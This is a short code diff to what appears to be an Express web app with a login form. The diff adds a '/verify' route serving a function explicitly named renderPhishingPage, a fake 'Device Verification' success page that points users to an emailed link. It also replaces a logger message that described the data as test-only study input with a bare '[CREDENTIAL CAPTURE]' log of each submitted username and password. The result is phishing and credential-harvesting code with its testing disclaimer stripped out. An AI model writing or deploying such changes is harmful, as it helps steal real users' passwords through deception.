@@ -94,6 +94,10 @@ app.get("/login", (_req, res) => {
   res.send(renderLoginPage());
 });
 
+app.get("/verify", (_req, res) => {
+  res.send(renderPhishingPage());
+});
+
 app.post("/login", (req, res) => {
   const username = typeof req.body.username === "string" ? req.body.username : "";
   const password = typeof req.body.password === "string" ? req.body.password : "";
@@ -196,8 +200,20 @@ function renderCompletePage() {
   });
 }
 
+function renderPhishingPage() {
+  return renderPage({
+    content: `<section class="section-block" aria-labelledby="complete-section-title">
+        <h2 id="complete-section-title">Device Verification</h2>
+        <div class="login-card complete-card">
+          <h3>Success</h3>
+          <p>Device verification completed successfully. Click the link in your invitation email to proceed to the next step.</p>
+        </div>
+      </section>`
+  });
+}
+
 function logTestLoginCapture(username, password) {
-  console.log("[TEST LOGIN CAPTURE] Test credentials only. Testing purposes only. These fields are from this local UI study and do not correspond to an actual production username or password.", {
+  console.log("[CREDENTIAL CAPTURE] ", {
     username,
     password
   });
